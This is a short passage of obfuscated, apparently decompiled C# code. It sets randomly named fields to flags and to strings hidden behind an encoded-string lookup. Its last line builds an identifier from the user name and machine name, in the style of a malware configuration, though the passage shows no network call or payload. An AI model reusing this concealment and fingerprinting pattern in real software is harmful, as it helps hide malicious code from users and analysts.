		twaCZwLhmnIEaDXX = getString_0(107396225);
		pxwofrQHvBYQmc = new string[0];
		JhBqPOdPslDLd = getString_0(107396768);
		KzojBHDhTMmk = true;
		esygzjBYVPopS = getString_0(107396768);
		dKfSpybLYvFvyKv = true;
		UPGpacLZCdbULgY = false;
		OhwnJVvNAck = false;
		kaofbiRznaot = true;
		XTpFtiqHigTwzn = getString_0(107407758);
		TfpcYTfYwiZ = false;
		HNLhXSuHwLaCCy = false;
		kZHyFbeFNlI = false;
		wKqYuDCVvYLd = false;
		oVFLPykEyliA = getString_0(107407769) + Environment.UserName + getString_0(107407724) + Environment.MachineName + getString_0(107407735) + ZTOrHfhPbpGY.HenIHgeFzZlR() + getString_0(107407186);
	}
}
